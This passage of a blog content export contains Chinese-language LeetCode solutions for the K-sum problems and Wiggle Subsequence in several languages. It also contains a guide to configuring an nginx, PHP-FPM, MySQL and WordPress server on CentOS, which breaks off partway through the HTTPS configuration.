更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode K sum 整理","slug":"leetcode-2-sum-3-sum-4-sum-3-sum-closest-k-sum","date":"2016-07-25T00:23:37.000Z","updated":"2021-01-08T13:32:16.889Z","comments":true,"path":"leetcode-2-sum-3-sum-4-sum-3-sum-closest-k-sum/","link":"","permalink":"https://www.hrwhisper.me/leetcode-2-sum-3-sum-4-sum-3-sum-closest-k-sum/","excerpt":"本次题解包括 Two Sum 3Sum 3Sum Closest 4Sum Two Sum II - Input array is sorted","text":"本次题解包括 Two Sum 3Sum 3Sum Closest 4Sum Two Sum II - Input array is sorted 1. Two Sum Given an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution. Example: 1234Given nums &#x3D; [2, 7, 11, 15], target &#x3D; 9,Because nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9,return [0, 1]. UPDATE (2016/2/13): The return format had been changed to zero-based indices. Please read the above updated description carefully. 题目地址：leetcode Two Sum 题意：给定一个整形数组和目标和target，返回数组中，两个数的和等于目标和target的下标。（输入保证只有一个合法的解） 思路：最朴素的方法是，枚举第一个数，枚举第二个数，这样复杂度O(n^2)。 如何更好？ 可以用二分，枚举第一个数x，然后第二个数为target - x，在数组中查找（需要先排序），复杂度O(nlogn), 。当然，如果把数组排好序，更好的方法是，直接双指针（接下来你会在3sum 4sum啥的看到类似的解法）。 说了这么多，其实最好的方法是直接hash。 把每个数作为key,下标作为值，放入hash表，然后遍历的时候找target - x。 C++ 123456789101112class Solution &#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123; unordered_map&lt;int, int&gt; vis; for (int i = 0; i &lt; nums.size(); i++) &#123; if (vis.find(target - nums[i]) != vis.end()) return vector&lt;int&gt;&#123;vis[target - nums[i]], i&#125;; vis[nums[i]] = i; &#125; return vector&lt;int&gt;&#123;-1, -1&#125;; &#125;&#125;; Java 12345678910class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; vis = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; if (vis.containsKey(target - nums[i])) return new int[]&#123;vis.get(target - nums[i]), i&#125;; vis.put(nums[i], i); &#125; return new int[2]; &#125;&#125; Python 12345678910111213class Solution(object): def twoSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; vis = &#123;&#125; for i, num in enumerate(nums): diff = target - num if diff in vis: return [vis[diff], i] vis[num] = i 15. 3Sum Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero. Note: The solution set must not contain duplicate triplets. 1234567For example, given array S &#x3D; [-1, 0, 1, 2, -1, -4],A solution set is:[ [-1, 0, 1], [-1, -1, 2]] 题目地址：leetcode 3Sum 题意：给定一个数组，求所有满足条件的三个数a,b,c，使得a+b+c=0 （结果要去重） 思路：排序。枚举第一个数，然后双指针，复杂度O（n^2) . 注意在过程中顺便去重。比如双指针中，找到满足条件的解了，L&lt;R &amp;&amp; nums[L] == nums[L-1]，进行 L++ C++ 1234567891011121314151617181920212223class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; sort(nums.begin(), nums.end()); vector&lt;vector&lt;int&gt;&gt; ans; for(int i = 0; i &lt; nums.size(); ++i)&#123; if(i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) continue; for(int l = i + 1, r = nums.size() - 1; l &lt; r;)&#123; int t = nums[i] + nums[l] + nums[r]; if(t &lt; 0) ++l; else if(t &gt; 0) --r; else &#123; ans.push_back(vector&lt;int&gt;&#123;nums[i], nums[l], nums[r]&#125;); ++l; while(l &lt; r &amp;&amp; nums[l] == nums[l - 1]) ++l; --r; while(l &lt; r &amp;&amp; nums[r] == nums[r + 1]) --r; &#125; &#125; &#125; return ans; &#125;&#125;; Java 12345678910111213141516171819202122class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) &#123; Arrays.sort(nums); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); for (int k = 0; k &lt; nums.length - 1; k++) &#123; if (k &gt; 0 &amp;&amp; nums[k] == nums[k - 1]) continue; for (int i = k + 1, j = nums.length - 1; i &lt; j; ) &#123; if (nums[i] + nums[j] == -nums[k]) &#123; ans.add(new ArrayList&lt;Integer&gt;(Arrays.asList(nums[k], nums[i], nums[j]))); i++; j--; while (i &lt; j &amp;&amp; nums[i] == nums[i - 1]) i++; while (i &lt; j &amp;&amp; j != nums.length - 1 &amp;&amp; nums[j] == nums[j + 1]) j--; &#125; else if (nums[i] + nums[j] &gt; -nums[k]) j--; else i++; &#125; &#125; return ans; &#125;&#125; Python 12345678910111213141516171819202122232425class Solution(object): def threeSum(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[List[int]] &quot;&quot;&quot; n = len(nums) nums.sort() ans = [] for i in range(n): if i &gt; 0 and nums[i] == nums[i - 1]: continue L, R = i + 1, n - 1 while L &lt; R: temp = nums[i] + nums[L] + nums[R] if temp == 0: ans.append([nums[i], nums[L], nums[R]]) L += 1 R -= 1 while L &lt; R and nums[L] == nums[L - 1]: L += 1 while R &gt; L and nums[R] == nums[R + 1]: R -= 1 elif temp &gt; 0: R -= 1 else: L += 1 return ans 16. 3Sum Closest Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution. 123For example, given array S &#x3D; &#123;-1 2 1 -4&#125;, and target &#x3D; 1.The sum that is closest to the target is 2. (-1 + 2 + 1 &#x3D; 2). 题目地址：leetcode 3Sum Closest 题意：给定一个数组，求数组中的三个数a,b,c的和sum, 使得sum最接近于target 思路：和3sum差不多，先排序，然后双指针。 C++ 12345678910111213141516171819202122232425class Solution &#123;public: int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) &#123; sort(nums.begin(), nums.end());int ans = target, diff = 0x7fffffff; for (int k = 0; k &lt; nums.size(); k++) &#123; if(k &gt; 0 &amp;&amp; nums[k] == nums[k - 1]) continue; for(int i = k + 1, j = nums.size() - 1; i &lt; j; )&#123; int t = nums[k] + nums[i] + nums[j]; if(abs(t - target) &lt; diff)&#123; ans = t; diff = abs(t - target); &#125; if(t == target)&#123; j--; i++; &#125;else if(t &gt; target) j--; else i++; &#125; &#125; return ans; &#125;&#125;; Python 12345678910111213141516171819202122232425class Solution(object): def threeSumClosest(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: int &quot;&quot;&quot; nums.sort() ans = ans_diff = 0x7fffffff n = len(nums) for i in range(n - 2): L, R = i + 1, n - 1 while L &lt; R: temp = nums[i] + nums[L] + nums[R] if temp == target: return target elif temp &gt; target: R -= 1 else: L += 1 diff = abs(temp - target) if diff &lt; ans_diff: ans, ans_diff = temp, diff return ans 18. 4Sum Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target. Note: The solution set must not contain duplicate quadruplets. 12345678For example, given array S &#x3D; [1, 0, -1, 0, -2, 2], and target &#x3D; 0.A solution set is:[ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2]] 题目地址：leetcode 4Sum 题意：给定一个数组，求4个数，使得a+b+c+d=target（ 结果要去重） 思路：和3sum差不多，都一个套路。先排序，然后枚举a和b,双指针代表c和d。 复杂度O(n^3) 可以用一些判断来加速，比如枚举第一个数的时候 nums[i] + nums[i + 1] + nums[i + 2] + nums[i + 3] &gt; target: break 这是当前能凑齐的最小的4个数，比target后面都不用做了 nums[i] + nums[n - 3] + nums[n - 2] + nums[n - 1] &lt; target: continue 这是当前凑齐的最大的4个数，比target小，说明第一个数不够大 C++ 12345678910111213141516171819202122232425262728293031class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; fourSum(vector&lt;int&gt;&amp; nums, int target) &#123; sort(nums.begin(), nums.end()); vector&lt;vector&lt;int&gt;&gt; ans; int n = nums.size(); for (int i = 0; i &lt; n - 3; i++) &#123; if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) continue; if (nums[i] + nums[i + 1] + nums[i + 2] + nums[i + 3] &gt; target) break; if (nums[i] + nums[n - 3] + nums[n - 2] + nums[n - 1] &lt; target) continue; for (int j = i + 1; j &lt; n - 2; j++) &#123; if (j &gt; i + 1 &amp;&amp; nums[j] == nums[j - 1]) continue; if (nums[i] + nums[j] + nums[j + 1] + nums[j + 2] &gt; target) break; if (nums[i] + nums[j] + nums[n - 2] + nums[n - 1] &lt; target) continue; for (int L = j + 1, R = n - 1; L &lt; R; ) &#123; int t = nums[i] + nums[j] + nums[L] + nums[R]; if (t == target) &#123; ans.push_back(vector&lt;int&gt;&#123; nums[i], nums[j], nums[L], nums[R]&#125;); L++; R--; while (L &lt; R &amp;&amp; nums[L] == nums[L - 1]) L++; while (L &lt; R &amp;&amp; nums[R] == nums[R + 1]) R--; &#125; else if (t &gt; target) R--; else L++; &#125; &#125; &#125; return ans; &#125;&#125;; Java 1234567891011121314151617181920212223242526272829class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; fourSum(int[] nums, int target) &#123; Arrays.sort(nums); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); int n = nums.length; for (int i = 0; i &lt; n - 3; i++) &#123; if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) continue; if (nums[i] + nums[i + 1] + nums[i + 2] + nums[i + 3] &gt; target) break; if (nums[i] + nums[n - 3] + nums[n - 2] + nums[n - 1] &lt; target) continue; for (int j = i + 1; j &lt; n - 2; j++) &#123; if (j &gt; i + 1 &amp;&amp; nums[j] == nums[j - 1]) continue; if (nums[i] + nums[j] + nums[j + 1] + nums[j + 2] &gt; target) break; if (nums[i] + nums[j] + nums[n - 2] + nums[n - 1] &lt; target) continue; for (int L = j + 1, R = n - 1; L &lt; R; ) &#123; int t = nums[i] + nums[j] + nums[L] + nums[R]; if (t == target) &#123; ans.add(new ArrayList&lt;&gt;(Arrays.asList(nums[i], nums[j], nums[L], nums[R]))); L++; R--; while (L &lt; R &amp;&amp; nums[L] == nums[L - 1]) L++; while (L &lt; R &amp;&amp; nums[R] == nums[R + 1]) R--; &#125; else if (t &gt; target) R--; else L++; &#125; &#125; &#125; return ans; &#125;&#125; Python 1234567891011121314151617181920212223242526272829303132class Solution(object): def fourSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[List[int]] &quot;&quot;&quot; n = len(nums) nums.sort() ans = [] for i in range(n - 3): if i &gt; 0 and nums[i] == nums[i - 1]: continue if nums[i] + nums[i + 1] + nums[i + 2] + nums[i + 3] &gt; target: break if nums[i] + nums[n - 3] + nums[n - 2] + nums[n - 1] &lt; target: continue for j in range(i + 1, n - 2): if j &gt; i + 1 and nums[j] == nums[j - 1]: continue if nums[i] + nums[j] + nums[j + 1] + nums[j + 2] &gt; target: break if nums[i] + nums[j] + nums[n - 2] + nums[n - 1] &lt; target: continue L, R = j + 1, n - 1 while L &lt; R: temp = nums[i] + nums[j] + nums[L] + nums[R] if temp == target: ans.append([nums[i], nums[j], nums[L], nums[R]]) L += 1 R -= 1 while L &lt; R and nums[L] == nums[L - 1]: L += 1 while R &gt; L and nums[R] == nums[R + 1]: R -= 1 elif temp &gt; target: R -= 1 else: L += 1 return ans 167. Two Sum II - Input array is sorted Given an array of integers that is already sorted in ascending order, find two numbers such that they add up to a specific target number. The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2. Please note that your returned answers (both index1 and index2) are not zero-based. You may assume that each input would have exactly one solution and you may not use the same element twice. Input: numbers={2, 7, 11, 15}, target=9 Output: index1=1, index2=2 题目地址：leetcode Two Sum II - Input array is sorted 题目大意 :给定一个升序的数组，求两个数和为target，返回他们的下标 思路：双指针即可。。 C++ 123456789101112class Solution &#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123; for(int i = 0, j = nums.size() - 1; i &lt; j;)&#123; if(nums[i] + nums[j] == target) return vector&lt;int&gt;&#123;i + 1, j + 1&#125;; else if(nums[i] + nums[j] &gt; target) j--; else i++; &#125; return vector&lt;int&gt;&#123;-1, -1&#125;; &#125;&#125;; Java 1234567891011class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; for(int i = 0, j = nums.length - 1; i &lt; j;)&#123; if(nums[i] + nums[j] == target) return new int[]&#123;i + 1, j + 1&#125;; else if(nums[i] + nums[j] &gt; target) j--; else i++; &#125; return new int[]&#123;-1, -1&#125;; &#125;&#125; Python 12345678910111213141516class Solution(object): def twoSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; i, j = 0, len(nums) - 1 while i &lt; j: if nums[i] + nums[j] == target: return [i + 1, j + 1] elif nums[i] + nums[j] &gt; target: j -= 1 else: i += 1 return [-1, -1] 这是leetcode Ksum题解整理 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Wiggle Subsequence","slug":"leetcode-wiggle-subsequence","date":"2016-07-21T02:30:19.000Z","updated":"2021-01-08T13:32:16.887Z","comments":true,"path":"leetcode-wiggle-subsequence/","link":"","permalink":"https://www.hrwhisper.me/leetcode-wiggle-subsequence/","excerpt":"leetcode Wiggle Subsequence A sequence of numbers is called a wiggle sequence if the differences between successive numbers strictly alternate between positive and negative. The first difference (if one exists) may be either positive or negative. A sequence with fewer than two elements is trivially a wiggle sequence. For example, [1,7,4,9,2,5] is a wiggle sequence because the differences (6,-3,5,-7,3) are alternately positive and negative. In contrast,[1,4,7,2,5] and [1,7,4,5,5] are not wiggle sequences, the first because its first two differences are positive and the second because its last difference is zero. Given a sequence of integers, return the length of the longest subsequence that is a wiggle sequence. A subsequence is obtained by deleting some number of elements (eventually, also zero) from the original sequence, leaving the remaining elements in their original order. Examples: 12345678910Input: [1,7,4,9,2,5]Output: 6The entire sequence is a wiggle sequence.Input: [1,17,5,10,13,15,10,5,16,8]Output: 7There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8].Input: [1,2,3,4,5,6,7,8,9]Output: 2 Follow up: Can you do it in O(n) time?","text":"leetcode Wiggle Subsequence A sequence of numbers is called a wiggle sequence if the differences between successive numbers strictly alternate between positive and negative. The first difference (if one exists) may be either positive or negative. A sequence with fewer than two elements is trivially a wiggle sequence. For example, [1,7,4,9,2,5] is a wiggle sequence because the differences (6,-3,5,-7,3) are alternately positive and negative. In contrast,[1,4,7,2,5] and [1,7,4,5,5] are not wiggle sequences, the first because its first two differences are positive and the second because its last difference is zero. Given a sequence of integers, return the length of the longest subsequence that is a wiggle sequence. A subsequence is obtained by deleting some number of elements (eventually, also zero) from the original sequence, leaving the remaining elements in their original order. Examples: 12345678910Input: [1,7,4,9,2,5]Output: 6The entire sequence is a wiggle sequence.Input: [1,17,5,10,13,15,10,5,16,8]Output: 7There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8].Input: [1,2,3,4,5,6,7,8,9]Output: 2 Follow up: Can you do it in O(n) time? 题目地址：leetcode Wiggle Subsequencey 题意：给定一个数组，让你求最大摆动序列长度。摆动序列定义为序列中任意相邻的三个数中abc，均有 a &lt; b , b &gt;c 或者a&gt;b b&lt;c 思路： 方法一，看到这个就想到和LIS差不多，迅速的DP一下，1A， 设dp[i] 为以i结尾的最大摆动序列长度，sign[i]为i这个数比之前的大还是小（大为1，小-1，初始0），更新条件如下： dp[j] + 1 &gt; dp[i] and (sign[j] &gt; 0 and nums[i] &lt; nums[j] or sign[j] &lt; 0 and nums[i] &gt; nums[j] or sign[j] == 0 and nums[i] != nums[j]): 很好的写出相应的python code： 123456789101112131415161718class Solution(object): def wiggleMaxLength(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if not nums: return 0 n = len(nums) dp, sign = [1] * n, [0] * n for i in range(1, n): for j in range(i - 1, -1, -1): if dp[j] + 1 &gt; dp[i] and ( sign[j] &gt; 0 and nums[i] &lt; nums[j] or sign[j] &lt; 0 and nums[i] &gt; nums[j] or sign[j] == 0 and nums[i] != nums[j]): sign[i] = 1 if nums[i] &gt; nums[j] else -1 dp[i] = dp[j] + 1 return max(dp) 方法二 虽然dp简单，但其复杂度O(n^2)并不是本题最佳解法。 摇摆序列要求升高，降低，升高。。。 或者降低，升高，降低。。。 那么我们只要找出数组中的“拐点” 即可 举个例子: 4 5 6 3 2 1这几个数中，4为起点，那么5和6中，我们肯定选6啊~因为之后的数要求小于5，小于5的必定也小于6 比如改为4 5 6 5，之前要是选5就没办法继续往下了。。 总之就是选最小的和选最大的（也就是拐点） 保证不丢最优解。 C++ 12345678910111213141516171819class Solution &#123;public: int wiggleMaxLength(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) return 0; int n = nums.size(); int ans = 1; for (int i = 1, j = 0; i &lt; n; j = i,i++) &#123; if (nums[j] &lt; nums[i]) &#123; ans++; while (i + 1 &lt; n &amp;&amp; nums[i] &lt;= nums[i + 1]) i++; &#125; else if (nums[j] &gt; nums[i]) &#123; ans++; while (i + 1 &lt; n &amp;&amp; nums[i] &gt;= nums[i + 1]) i++; &#125; &#125; return ans; &#125;&#125;; Java 123456789101112131415161718public class Solution &#123; public int wiggleMaxLength(int[] nums) &#123; if (nums.length == 0) return 0;int n = nums.length;int ans = 1;for (int i = 1, j = 0; i &lt; n; j = i,i++) &#123;if (nums[j] &lt; nums[i]) &#123;ans++;while (i + 1 &lt; n &amp;&amp; nums[i] &lt;= nums[i + 1]) i++;&#125;else if (nums[j] &gt; nums[i]) &#123;ans++;while (i + 1 &lt; n &amp;&amp; nums[i] &gt;= nums[i + 1]) i++;&#125;&#125;return ans; &#125;&#125; Python 1234567891011121314151617181920class Solution(object): def wiggleMaxLength(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if not nums: return 0 n = len(nums) ans, i, j, = 1, 1, 0 while i &lt; n: if nums[j] &lt; nums[i]: ans += 1 while i + 1 &lt; n and nums[i + 1] &gt;= nums[i]: i += 1 elif nums[j] &gt; nums[i]: ans += 1 while i + 1 &lt; n and nums[i + 1] &lt;= nums[i]: i += 1 i, j = i + 1, i return ans 本题是leetcode 376 Wiggle Subsequence题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"LNMP站点配置指南","slug":"wordpress-lnmp-site-building","date":"2016-07-17T03:23:45.000Z","updated":"2020-10-20T15:00:35.097Z","comments":true,"path":"wordpress-lnmp-site-building/","link":"","permalink":"https://www.hrwhisper.me/wordpress-lnmp-site-building/","excerpt":"最近把服务器的架构从LAMP换成了LNMP（linux + nginx + mysql + php），顺便换了个服务器。下面把过程记录一下。 2017/7/17 更新 : centos 6.9 + nginx 1.12.1 + mysql 5.7 + php 7.1","text":"最近把服务器的架构从LAMP换成了LNMP（linux + nginx + mysql + php），顺便换了个服务器。下面把过程记录一下。 2017/7/17 更新 : centos 6.9 + nginx 1.12.1 + mysql 5.7 + php 7.1 上一次的apache 在低配置服务器下的优化 执行完，博客已经在LAMP稳定的运行了133天。 after-optimizing-apache 可以看出，优化还是比较成功的，那么这次为什么要改成LNMP呢? 原因是我感觉有时候浏览blog的时候速度很慢，但过一会儿又很快，感觉是apache阻塞式运行方式造成了并发不行。。。 现在换了LNMP后，没有感觉这些问题。 服务器系统为centos 6. 环境部分 Nginx 首先编辑源 vim /etc/yum.repos.d/nginx.repo 输入如下内容 12345[nginx] name&#x3D;nginx repo baseurl&#x3D;http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;centos&#x2F;$releasever&#x2F;$basearch&#x2F; gpgcheck&#x3D;0 enabled&#x3D;1 然后使用yum安装步骤如下 sudo yum install nginx sudo /etc/init.d/nginx start 这时候可以通过IP地址访问你的站点看看是否是nginx呢? 忘记IP了？（如下命令打印出IP） 1ifconfig eth0 grep inet awk &#39;&#123; print $2 &#125;&#39; 接下来进行配置，打开 sudo vi /etc/nginx/nginx.conf 将worker_processes 设置为4; PHP安装和配置 新版安装 yum默认的版本太老了，装5.6配置一下源： 1234567CentOS&#x2F;RHEL 7.x:rpm -Uvh https:&#x2F;&#x2F;dl.fedoraproject.org&#x2F;pub&#x2F;epel&#x2F;epel-release-latest-7.noarch.rpmrpm -Uvh https:&#x2F;&#x2F;mirror.webtatic.com&#x2F;yum&#x2F;el7&#x2F;webtatic-release.rpmCentOS&#x2F;RHEL 6.x:rpm -Uvh https:&#x2F;&#x2F;dl.fedoraproject.org&#x2F;pub&#x2F;epel&#x2F;epel-release-latest-6.noarch.rpmrpm -Uvh https:&#x2F;&#x2F;mirror.webtatic.com&#x2F;yum&#x2F;el6&#x2F;latest.rpm 然后安装php7 yum install php71w php71w-fpm php71w-mysql 如果要安装php5.6 yum install php56w php56w-fpm php56w-mysql 旧版安装 系统默认的比较老，可以直接： sudo yum install php-fpm php-mysql 配置 接着编辑php.ini文件，将cgi.fix_pathinfo设置为0 sudo vi /etc/php.ini cgi.fix_pathinfo=0 sudo vi /etc/php-fpm.d/www.conf 设置用户和组别为nginx [...] ; Unix user/group of processes ; Note: The user is mandatory. If the group is not set, the default user's group ; will be used. ; RPM: apache Choosed to be able to access some dir as httpd user = nginx ; RPM: Keep a group allowed to write in log dir. group = nginx [...] 重启php-fpm sudo service php-fpm restart PHP-FPM优化 由于是小的内存，只有512MB，除开启虚拟内存外，我对php-fpm也进行了优化。 sudo vi /etc/php-fpm.d/www.conf 1234pm.max_children &#x3D; 20pm.start_servers &#x3D; 5pm.min_spare_servers &#x3D; 1pm.max_spare_servers &#x3D; 5 Mysql Mysql5.7新版安装 要安装新版本可以先去https://dev.mysql.com/downloads/repo/yum/ 找到系统对应源的地址 比如我的： 1wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql57-community-release-el6-11.noarch.rpm 然后安装 123sudo yum localinstall mysql57-community-release-el6-11.noarch.rpmsudo yum -y install mysql-community-serversudo service mysqld start Mysql5.7默认 root 安装了 validate_password 插件，这个插件要求必须使用强密码，生成的 root 密码在 /var/log/mysqld.log，查看： cat /var/log/mysqld.log grep password 然后 sudo /usr/bin/mysql_secure_installation 输入密码后，修改密码（要求强密码，最好字母大小写、数字、特殊字符），然后一路按y 旧版安装 系统yum里面的为5.1版本，安装直接如下： sudo yum -y install mysql-server sudo /etc/init.d/mysqld restart 打开设置向导，设置好密码后，一路yes sudo /usr/bin/mysql_secure_installation 配置 登入mysql mysql -u root -p 创建数据库 create database wordpress; 创建用户把hrwhisper改成你的用户即可 create user hrwhisper@localhost; 设置密码 set password for hrwhisper@localhost=password(\"123456\"); 设置权限 grant select,insert,update,delete,create,index,references,alter on wordpress.* to hrwhisper@localhost identified by '123456'; 做完上面的步骤后 FLUSH PRIVILEGES; exit; 恢复数据库 如果是旧的站点，可以将数据库导入,方法如下： 登录数据库后，进行如下操作 （1）选择数据库 mysql&gt;use abc; （2）设置数据库编码 mysql&gt;set names utf8; （3）导入数据（注意sql文件的路径） mysql&gt;source /home/abc/abc.sql; 获取wordpress 和LAMP一样， wget http://wordpress.org/latest.tar.gz tar -xzvf latest.tar.gz cp ~/wordpress/wp-config-sample.php ~/wordpress/wp-config.php sudo vi ~/wordpress/wp-config.php 修改如下内容 // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define('DB_NAME', 'wordpress'); /** MySQL database username */ define('DB_USER', 'wordpressuser'); /** MySQL database password */ define('DB_PASSWORD', 'password'); sudo mkdir -p /var/www/html sudo cp -r ~/wordpress/* /var/www/html cd /var/www/ 修改用户和用户组 sudo chown nginx:nginx * -R sudo usermod -a -G nginx username 配置nginx路径 sudo vim /etc/nginx/conf.d/default.conf 这里列举修改的地方 在index那行中添加index.php 改变根目录为 /var/www/html; 把 \"location ~ .php$ {\", 的注释全部去掉 改变location ~下的root路径为/var/www/html; 修改fastcgi_param 可以参考如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253## The default server#server &#123; listen 80; server_name _;#charset koi8-r;#access_log logs&#x2F;host.access.log main;location &#x2F; &#123; root &#x2F;var&#x2F;www&#x2F;html; index index.php index.html index.htm; &#125;error_page 404 &#x2F;404.html; location &#x3D; &#x2F;404.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125;# redirect server error pages to the static page &#x2F;50x.html # error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http:&#x2F;&#x2F;127.0.0.1; #&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ &#123; root &#x2F;var&#x2F;www&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;# deny access to .htaccess files, if Apache&#39;s document root # concurs with nginx&#39;s one # #location ~ &#x2F;\\.ht &#123; # deny all; #&#125;&#125; 设置自启动 配置完上面的记得重启一下 123sudo chkconfig --levels 235 mysqld onsudo chkconfig --levels 235 nginx onsudo chkconfig --levels 235 php-fpm on 到这里，基本配置已经结束，站点已经能正常访问。 下面是进阶的配置，如开启gzip、rewrite、https等 其他的配置 开启gzip vim /etc/nginx/nginx.conf 12345678910111213141516gzip on;# 启用gzip压缩的最小文件，小于设置值的文件将不会压缩gzip_min_length 1k;# gzip 压缩级别，1-10，数字越大压缩的越好，也越占用CPU时间，后面会有详细说明gzip_comp_level 2;# 进行压缩的文件类型。javascript有多种形式。其中的值可以在 mime.types 文件中找到。gzip_types text&#x2F;plain application&#x2F;javascript application&#x2F;x-javascript text&#x2F;css application&#x2F;xml text&#x2F;javascript application&#x2F;x-httpd-php image&#x2F;jpeg image&#x2F;gif image&#x2F;png;# 是否在http header中添加Vary: Accept-Encoding，建议开启gzip_vary on;# 禁用IE 6 gzipgzip_disable &quot;MSIE [1-6]\\.&quot;; 开启rewrite 不开启rewrite wordpress修改固定链接是无法使用的 vim /etc/nginx/conf.d/default.conf 下面是一个完整的vhost的配置文件 1234567891011121314151617location &#x2F; &#123; index index.html index.htm index.php; root &#x2F;www&#x2F;wwwroot&#x2F;ccvita.com; if (-f $request_filename&#x2F;index.html)&#123; rewrite (.*) $1&#x2F;index.html break; &#125; if (-f $request_filename&#x2F;index.php)&#123; rewrite (.*) $1&#x2F;index.php; &#125; if (!-f $request_filename)&#123; rewrite (.*) &#x2F;index.php; &#125;&#125; 开启swap 参考：https://www.digitalocean.com/community/tutorials/how-to-add-swap-on-centos-6 开启https 我开启了强制HTTPS，所以 /etc/nginx/conf.d/default.conf 配置为 12345server &#123; listen 80; server_name hrwhisper.me; return 301 https:&#x2F;&#x2F;www.hrwhisper.me$request_uri;&#125; 接下来配置/etc/nginx/conf.d/ssl.conf，主要是把ssl 设为on, 然后设置ssl_certificate 和ssl_certificate_key为你证书的路径（注意不能直接拿apache的来用，那个有3个，直接用证书链不完整，电脑OK，但手机显示不受信任） PS: 还没有证书？参考Centos 获取 Let’s Encrypt 证书 设置ssl协议为 TLSv1 TLSv1.1 TLSv1.2 ， （不要SSL3 SSL2），这样兼容了绝大部分的机器，并更安全。此外，设置了ssl_ciphers，开启了HSTS。 剩下的其实就是普通站点原来的default.conf复制过来的。 在 SSL安全性 评分中（https://www.ssllabs.com/ssltest/），达到最高的等级A+ lnmp-https-score 下面是完整的配置文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879## The default server#server &#123; listen 443; listen [::]:443 ssl ipv6only&#x3D;on; server_name hrwhisper.me; ssl on; ssl_certificate 